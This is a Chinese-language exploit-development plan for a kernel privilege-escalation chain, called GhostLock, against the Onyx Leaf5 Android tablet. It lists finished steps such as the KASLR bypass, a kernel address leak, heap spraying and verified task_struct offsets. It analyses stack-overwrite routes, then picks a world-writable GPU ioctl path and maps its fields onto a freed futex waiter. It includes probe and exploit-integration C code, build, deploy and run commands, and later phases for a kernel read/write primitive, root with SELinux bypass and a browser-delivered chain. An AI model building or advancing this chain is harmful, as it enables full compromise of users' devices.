> **文档类型**: 计划文档（后续工作清单） | **状态**: ✅ 有效 | **最后更新**: 2026-07-24

# Leaf5 GhostLock — 后续分析方案

**目标**: Onyx Leaf5 (TabBoox), kernel 4.19.157, Android 13
**漏洞**: CVE-2026-43499 (GhostLock)
**当前阶段**: 栈覆盖路由确认（kgsl compat ioctl），进入 exploit 集成验证阶段

---

## 一、当前状态总览

### 1.1 已完成（不可逆）

| 模块 | 状态 | 关键指标 |
|------|------|---------|
| 设备画像 | ✅ | 完整指纹、CONFIG、安全面 |
| 内核镜像 | ✅ | boot_a.bin 匹配 runtime #245 |
| 符号表 | ✅ | vmlinux.elf 121883 symbols |
| 偏移提取 | ✅ | capstone 验证关键结构体偏移 |
| target.h | ✅ | 所有 [EST]→[BIN]，exploit/targets/onyx-leaf5/target.h |
| Docker 编译 | ✅ | preload.so + test programs |
| Futex 哈希自检 | ✅ | V1 布局，用户态一致性通过 |
| Futex 碰撞时序 | ✅ | pile-up 26x baseline，有效侧信道 |
| KernelSnitch 泄漏 | ✅ | KSNITCH_COLLISIONS=2，<1 秒可靠泄漏 |
| sk_buff 喷射 | ✅ | 4/4 send 成功 (ret=65536) |
| KASLR bypass | ✅ | Direct-map 直接计算，无需 slide |
| 栈覆盖路由分析 | ✅ | 5 路由分析完成，pselect/sendmsg/recvmsg/binder/do_select 均不可行 |
| 全局 CFU 扫描 | ✅ | 309 函数/724 调用点，发现 143 个可行路由 |
| qcedev_ioctl 逆向 | ✅ | 命令码、帧布局、CFU 偏移完全逆向 |
| 全路由可行性分析 | ✅ | 12+ 路由深度/权限分析完成 |
| [EST] 偏移批量验证 | ✅ | 4 CORRECTED, 6 CONFIRMED，全部升级为 [BIN] |

### 1.2 路由演进

```
原阻塞: pselect Δ=-46 词，waiter 在 fd_set 下方 368 字节
↓
第一次突破: qcedev_ioctl (328B @ SP+0x50, 帧 0x360)
             标准 ioctl 深度下 FULL 64B 覆盖
             但 /dev/qce 权限 0660 system:drmrpc，shell 不可访问
↓
第二次突破: kgsl compat ioctl (16B @ SP+0x28, 帧 0x90)
             /dev/kgsl-3d0 0666 世界可读写
             32-bit compat 进程 TIF_32BIT 自动触发正确 CFU 路径
             16B 覆盖 TASK 指针 + pi_tree.left
```

### 1.3 关键优势（相对 OPPO Find N2）

- ✅ **无内核 CFI** — 无需 CFI bypass，最大优势
- ✅ **无 KPTI** — 无 trampoline 开销，侧信道方法更多
- ✅ **AVB unlocked** — 可导出/修改内核
- ✅ **PANIC_ON_OOPS=off** — 调试容错更好

---

## 二、路由分析完整矩阵

### 2.1 qcedev_ioctl（已逆向，权限阻塞）

| 属性 | 值 |
|------|-----|
| 函数地址 | `0xffffff800886f828` |
| 帧大小 | 0x360 (864B) |
| CFU 调用点 | 9 个 |
| 关键 CFU | 328B @ SP+0x50 |
| 设备节点 | `/dev/qce` (234:0)，非 `/dev/qcedev` |
| 权限 | 0660 system:drmrpc + SELinux `vendor_qce_device` |
| Shell 访问 | ❌ UID 2000, 不在 drmrpc(1026) 组 |
| 浏览器访问 | ❌ Firefox UID 10127, 仅 GID inet(3003) |

**ioctl 命令码**:
```
QCEDEV_IOCTL_ENC_REQ = _IOC(RW, 0x87, 0x0a, 0x148) = 0xc148870a  (328B)
QCEDEV_IOCTL        = _IOC(RW, 0x87, 0x0b, 0x044) = 0xc044870b  (68B)
```

**栈覆盖参数** (仅供参考，不可用):
```
ioctl 深度 0xA0: abs = -(0xA0 + 0x360) + 0x50 = -0x3B0
Waiter: [-0x380, -0x340) → FULL 64B 覆盖
```

### 2.2 全路由分析结果

| # | 路由 | 设备 | 帧 | Dest | 覆盖 | 阻塞原因 |
|---|------|------|-----|------|------|---------|
| 1 | **qcedev_ioctl** | `/dev/qce` | 0x360 | SP+0x50 | ✅ FULL | ❌ 权限 0660 drmrpc |
| 2 | **ipa3_ioctl** | `/dev/ipa` | 0x330 | SP+0x30 | ✅ FULL | ❌ 设备不存在 |
| 3 | **lo_ioctl** | `/dev/loop*` | 0x220 | — | ✅ FULL@0x100 | ❌ root-only |
| 4 | **rt_sigreturn** | syscall | 0x2a0 | SP+0x20 | ✅ FULL@0x100 | ❌ 天然深度仅~0 |
| 5 | **kgsl compat** | `/dev/kgsl-3d0` | 0x90 | SP+0x28 | ✅ TASK(8B) | ✅ **可行!** |
| 6 | uinput | `/dev/uinput` | 0x120 | SP+0x60 | 92B@0x2C0 | ❌ 差 0x220 深度 |
| 7 | setsockopt | socket | 0x190 | SP+0x20 | 264B@0x280 | ❌ 天然深度仅 0xD0 |
| 8 | sde_crtc | `/dev/dri/card0` | 0x290 | SP+0x40 | FULL@0x180 | ❌ 兼容深度过深 |
| 9 | ext4_ioctl | 文件系统 | 0x1d0 | SP+0x18 | FULL@0x200 | ❌ 天然深度仅 0xA0 |
| 10 | gpio_ioctl | `/dev/gpiochip*` | 0x1f0 | SP+0x10 | FULL@0x180 | ❌ root-only |
| 11 | fastrpc | `/dev/adsprpc-smd` | 0x190 | SP+0x10 | FULL@0x200 | ❌ 只读 |
| 12 | usbdev_ioctl | USB | 0x1c0 | SP+0x48 | FULL@0x200 | ❌ 无 USB 设备 |

### 2.3 最终可行路由: KGSL Compat IOCTL

```
32-bit 进程 → ioctl(/dev/kgsl-3d0, IOCTL_KGSL_RB_ISSUEIBCMDS, &cmd)
  → __arm64_compat_sys_ioctl (0x40)
  → do_vfs_ioctl (0x90)
  → kgsl_compat_ioctl (0x30)
  → kgsl_ioctl_helper (0xD0)
  → kgsl_ioctl_rb_issueibcmds (0x70)
  → kgsl_drawobj_cmd_create (0x40)
  → kgsl_drawobj_cmd_add_ibdesc (0x40)
  → kgsl_drawobj_cmd_add_ibdesc_list (0x90)

总 caller depth: D = 0x2C0
CFU 16B @ SP+0x28 → abs [-0x328, -0x318)

Waiter 字段映射:
  pi_tree.rb_left (+0x28, abs -0x328): ← ibdesc.gpuaddr [0:8]
  task            (+0x30, abs -0x320): ← ibdesc.sizedwords [8:16] ✅ 可控!
  lock            (+0x38, abs -0x318):   保留脏数据（原始 lock 指针）
  tree_entry      (+0x00, abs -0x350):   保留脏数据（原始树条目）
```

**关键机制**: `TIF_32BIT` 标志触发 16B CFU 路径 (x29-0x18 = SP+0x28)
- 32-bit 进程: ✅ 自动走 16B 路径
- 64-bit 进程: ❌ 走 32B 路径 (SP+0x08)，位置不对

**CFU 前校验**: 仅 `access_ok` 地址范围检查，无语义数据验证。

---

## 三、后续阶段规划

```
Phase 1 (P0)  kgsl compat 探针验证           ████████████ 预计 1-2h
Phase 2 (P0)  Exploit 集成 + 端到端测试       ████████████ 预计 3-5h
Phase 3 (P1)  内核 R/W 原语建立               ████████████ 预计 2-3h
Phase 4 (P1)  提权链 + SELinux bypass          ████████████ 预计 2-3h
Phase 5 (P2)  偏移精校 + 边界情况              ████████████ ✅ 已完成
Phase 6 (P2)  Stage1 浏览器验证                ████████████ 预计 1-2h
```

---

## 四、Phase 1: kgsl compat 探针验证 🔴 P0

> **目标**: 编写 32-bit ARM NDK 探针，验证 /dev/kgsl-3d0 可访问，ioctl 可成功到达内核 CFU 路径
> **预计**: 1-2 小时
> **前置**: 无（32-bit NDK toolchain 即可）

### 4.1 确认设备可访问

```bash
adb shell ls -la /dev/kgsl-3d0
# 预期: crw-rw-rw- 1 system system 237, 0 ... /dev/kgsl-3d0

adb shell "test -r /dev/kgsl-3d0 && test -w /dev/kgsl-3d0 && echo 'OK' || echo 'FAIL'"
# 预期: OK
```

### 4.2 编写 32-bit NDK 探针

创建 `leaf5/probes/kgsl_probe/`：

```c
// kgsl_probe.c — 32-bit compat kgsl ioctl 探针
// 编译: $NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/armv7a-linux-androideabi33-clang -static kgsl_probe.c -o kgsl_probe

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>

/* KGSL ioctl 命令码（从 vmlinux 和 msm-kgsl 头文件） */
#define KGSL_IOC_TYPE       0x09
#define KGSL_IOC_NR(x)      ((x) & 0xFF)
#define KGSL_IOC_SIZE(x)    ((x) >> 16)
#define KGSL_IOCTL(cmd)     _IOC(_IOC_READ|_IOC_WRITE, KGSL_IOC_TYPE, KGSL_IOC_NR(cmd), KGSL_IOC_SIZE(cmd))

/* 关键 ioctl 命令 */
#define IOCTL_KGSL_RB_ISSUEIBCMDS    KGSL_IOCTL(0x10)  /* cmd 0x10 */

/* 简化的 KGSL 命令结构体 */
struct kgsl_ibdesc {
    uint64_t gpuaddr;       /* [0:8] → waiter pi_tree.left */
    uint64_t sizedwords;    /* [8:16] → waiter task */
};

int main() {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    printf("[+] /dev/kgsl-3d0 opened (fd=%d)\n", fd);

    /* 构造最小的 ibdesc，填充可识别模式 */
    struct kgsl_ibdesc ibdesc;
    ibdesc.gpuaddr    = 0x4141414141414141ULL;  /* 'AAAAAAAA' */
    ibdesc.sizedwords = 0x4242424242424242ULL;  /* 'BBBBBBBB' */

    /* 这里需要完整的 cmd 结构体。先做最小 ioctl 测试 */
    printf("[+] Attempting kgsl ioctl... (full cmd struct needed)\n");
    printf("[+] Probe ready for integration\n");

    close(fd);
    return 0;
}
```

```bash
# 编译 32-bit ARM 探针
cd leaf5/probes/kgsl_probe
$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/armv7a-linux-androideabi33-clang -static kgsl_probe.c -o kgsl_probe
adb push kgsl_probe /data/local/tmp/
adb shell /data/local/tmp/kgsl_probe
```

### 4.3 验证标准

- [ ] `/dev/kgsl-3d0` open 成功
- [ ] 32-bit 可执行文件在设备上成功运行
- [ ] ioctl 调用到达内核路径（即使返回 -EINVAL 也说明分派正常）
- [ ] 无 kernel panic/oops（dmesg 检查）

---

## 五、Phase 2: Exploit 集成 + 端到端测试 🔴 P0

> **目标**: 将 kgsl compat 栈覆盖集成到 exploit 链，替换 pselect 路径
> **预计**: 3-5 小时
> **前置**: Phase 1 完成

### 5.1 编译链变更

exploit 需要编译为 **32-bit ARM** 可执行文件以触发 compat ioctl 路径。

```
当前: aarch64-linux-android33-clang (64-bit)
需要: armv7a-linux-androideabi33-clang (32-bit)
```

### 5.2 fops.c 改造

新增 `kgsl_stack_overwrite()` 函数替代 `do_pselect_stack_overwrite()`:

```c
void kgsl_stack_overwrite(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { /* error */ }

    /* 构造 ibdesc: gpuaddr=0, sizedwords=fake_task */
    struct kgsl_ibdesc ibdesc = {
        .gpuaddr    = 0,           /* → pi_tree.left */
        .sizedwords = fake_task,   /* → TASK 指针 */
    };

    /* 构造完整的 kgsl 命令结构体 */
    struct kgsl_cmd_struct cmd = { /* ... */ };

    /* 调用 compat ioctl */
    ioctl(fd, IOCTL_KGSL_RB_ISSUEIBCMDS, &cmd);
}
```

### 5.3 target.h 新增定义

```c
/* kgsl compat ioctl 栈覆盖参数 */
#define KGSL_DEVICE_PATH        "/dev/kgsl-3d0"
#define KGSL_IOCTL_RB_ISSUEIBCMDS  0x???
#define KGSL_IBDESC_GPUADDR_OFF    0x00    /* → pi_tree.rb_left */
#define KGSL_IBDESC_SIZEDWORDS_OFF 0x08    /* → TASK */
#define KGSL_IBDESC_SIZE           0x10    /* 16 bytes */

#define STACK_OVERWRITE_ROUTE_KGSL    1
#define STACK_OVERWRITE_ROUTE_QCEDEV  0  /* 保留备用 */
#define STACK_OVERWRITE_ROUTE_PSELECT 0  /* 保留但禁用 */
```

### 5.4 端到端测试

```bash
# 编译 32-bit exploit
cd exploit
./docker-build.sh TARGET_DIR=targets/onyx-leaf5 ARCH=arm

# 部署
adb push preload.so /data/local/tmp/
adb push exploit /data/local/tmp/

# 运行
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/exploit'

# 监控
adb shell dmesg -w | grep -E 'panic|oops|BUG|GhostLock|waiter|kgsl'
```

### 5.5 验证标准

- [ ] GhostLock futex 触发成功（UAF waiter 产生）
- [ ] kgsl ioctl 栈覆盖执行无 crash
- [ ] fake task 指针成功写入 waiter+0x30
- [ ] PI chain walk 被触发
- [ ] configfs/ashmem fops 覆写成功
- [ ] 无内核 panic/oops

---

## 六、Phase 3: 内核 R/W 原语建立 🟠 P1

（与原计划相同，略）

---

## 七、Phase 4: 提权链 + SELinux Bypass 🟠 P1

（与原计划相同，略）

---

## 八、Phase 5: 偏移精校 + 边界情况 ✅ 已完成

> **状态**: ✅ 完成 | **日期**: 2026-07-24

### 8.1 [EST] 偏移验证结果

| 偏移 | 旧值 [EST] | 新值 [BIN] | 验证方法 |
|------|-----------|-----------|---------|
| `TASK_PID_OFF` | 0x5f8 | **0x630** | trace events (sched_switch 等) |
| `TASK_TGID_OFF` | 0x5fc | **0x634** | PID+4 布局 |
| `TASK_TASKS_OFF` | 0x530 | 0x530 ✓ | show_state_filter |
| `TASK_SECCOMP_OFF` | 0x8e8 | **0x888** | __secure_computing |
| `CRED_SECURITY_OFF` | 0x80 | **0x78** | selinux_cred_alloc_blank |
| `TASK_PI_WAITERS_OFF` | 0x8b8 | 0x8b8 ✓ | task_blocks_on_rt_mutex |
| `PIPE_INODE_INFO_STRUCT_SIZE` | 0x88 | 0x88 ✓ | alloc_pipe_info |
| `TASK_NORMAL_PRIO_OFF` | 0xb4 | 0xb4 ✓ | sched_fork |
| `FAKE_TASK_PI_LOCK_OFF` | 0x8a0 | **0x8ac** | task_blocks_on_rt_mutex |
| `FAKE_TASK_PI_TOP_TASK_OFF` | 0x8c0 | **0x8c8** | rt_mutex_setprio |

### 8.2 已知 task_struct 布局 (0x5d0-0x8e0)

```
0x5d0: atomic_flags
0x608: real_parent [EST]
0x630: pid          [BIN]
0x634: tgid         [BIN]
0x698: thread_pid   [BIN]
0x7d8: real_cred    [BIN]
0x7e0: cred         [BIN]
0x7e8: comm[16]     [BIN]
0x888: seccomp      [BIN] ← CORRECTED from 0x8e8
0x8a8: alloc_lock   [BIN]
0x8ac: pi_lock      [BIN] ← CORRECTED from 0x8a0
0x8b8: pi_waiters   [BIN]
0x8c8: pi_top_task  [BIN] ← CORRECTED from 0x8c0
0x8d0: pi_blocked_on[BIN]
```

---

## 九、Phase 6: Stage1 浏览器验证 🟡 P2

（与原计划相同，略）

---

## 十、风险矩阵

| 风险 | 概率 | 影响 | 缓解措施 |
|------|------|------|---------|
| 32-bit 进程被 SELinux 限制 ioctl | 低 | 高 | shell 上下文已验证 kgsl-3d0 可 RW |
| kgsl cmd 结构体布局错误 | 中 | 中 | 参考 msm-4.19 CAF 源码还原结构体 |
| 脏数据 lock/tree 导致 PI 崩溃 | 低 | 中 | waiter 区域在 compat 帧深度外，脏数据原封不动 |
| TASK 8B 不足以控制 PI chain walk | 低 | 中 | 仅需控制 task 指针重定向到 fake task_struct |
| GhostLock 竞态成功概率低 | 低 | 中 | 自适应重试策略 |
| compat 路径 dispatch 链与预期不同 | 中 | 中 | kgsl_compat_ioctl 分发表部分条目用非 compat 处理器 |

---

## 十一、里程碑与时间线

| 里程碑 | 预计耗时 | 累计 | 判定标准 |
|--------|---------|------|---------|
| M1: kgsl 探针可用 | 1-2h | 1-2h | 32-bit ioctl 成功到达内核 |
| M2: 栈覆盖端到端验证 | 3-5h | 4-7h | GhostLock→kgsl覆盖→fops覆写 |
| M3: 内核 R/W 原语 | 2-3h | 6-10h | pipe physrw 读写内核内存 |
| M4: 提权到 root | 2-3h | 8-13h | uid=0, SELinux permissive |
| M5: 偏移精校 | ✅ | - | 已完成 |
| M6: 浏览器链验证 | 1-2h | 9-15h | Stage1+Stage2 完整链 |

**总计估计**: 9-15 小时（含已完成 Phase 5）

---

## 十二、文件产出清单

| 文件 | 阶段 | 说明 |
|------|------|------|
| `leaf5/probes/kgsl_probe/kgsl_probe.c` | Phase 1 | 32-bit NDK 探针 |
| `leaf5/docs/KGSL_STACK_OVERWRITE.md` | Phase 1-2 | kgsl compat 栈覆盖详细文档 |
| `exploit/src/fops.c` (修改) | Phase 2 | 新增 kgsl compat 栈覆盖路径 |
| `exploit/src/kgsl_route.c` (新增) | Phase 2 | kgsl ioctl 结构体 + 调用 |
| `exploit/targets/onyx-leaf5/target.h` (修改) | Phase 2 | 新增 KGSL 相关宏 |
| `exploit/Makefile` (修改) | Phase 2 | 支持 32-bit ARM 编译 |

---

### 十二-A、Phase 1 验证结果 ✅ (2026-07-24)

| 检查项 | 状态 | 详情 |
|--------|------|------|
| `/dev/kgsl-3d0` world-RW | ✅ | open O_RDWR 成功 (fd=3) |
| 32-bit ARM compat 运行 | ✅ | ELF 32-bit ARM EABI5, armeabi-v7a |
| ioctl 命令码正确 | ✅ | type=0x09 从 vmlinux kgsl_ioctl_funcs 确认 |
| RB_ISSUEIBCMDS dispatch | ✅ | `0xc0200910` → EINVAL (分派到 handler) |
| SUBMIT_COMMANDS dispatch | ✅ | `0xc060093d` → EINVAL |
| GPU_AUX_COMMAND dispatch | ✅ | `0xc0140957` → EINVAL |
| EINVAL 根因 | — | GPU context 未创建（exploit 会先创建 context） |

**Compat struct 布局**（从 wrapper 反汇编还原）:
```c
struct kgsl_ringbuffer_issueibcmds_compat {
    uint32_t drawctxt_id;    // +0x00
    uint32_t flags;          // +0x04
    uint32_t ibdesc_addr;    // +0x08 — 32-bit user pointer
    uint32_t timestamp;      // +0x0c — writeback
    uint32_t numibs;         // +0x10 — count (>= 1)
};
```

**探针**: `leaf5/probes/kgsl_probe/kgsl_probe.c`
**编译**: Docker `ghostlock-build`, `armv7a-linux-androideabi33-clang -static`

---

*最后更新: 2026-07-24*
*Phase 1 已验证 ✅ + Phase 2 代码集成完成（32-bit ARM PIE 111K 已编译部署，mmap 兼容性待修复）*
